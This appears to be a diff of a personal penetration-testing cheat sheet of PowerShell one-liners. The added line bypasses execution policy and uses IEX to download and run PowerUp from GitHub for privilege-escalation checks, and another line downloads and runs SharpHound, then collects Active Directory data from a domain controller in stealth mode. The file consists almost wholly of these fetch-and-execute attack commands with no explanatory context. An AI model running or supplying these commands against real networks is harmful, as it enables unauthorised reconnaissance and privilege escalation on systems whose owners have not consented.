@@ -1,4 +1,9 @@
-###Blooooooodddhouundddd kidsss####
+powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
+
+
+-------------------------------------------------------
+
+###Blooooooodddhouundddd kidsss#### ---- In Progress <<<-----
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1') 
 Invoke-BloodHound -DomainController <domain IP> -Domain <FQDN> -CSVFolder C:\users\public\libraries -CSVPrefix <prefix> -CollectionMethod Stealth
         
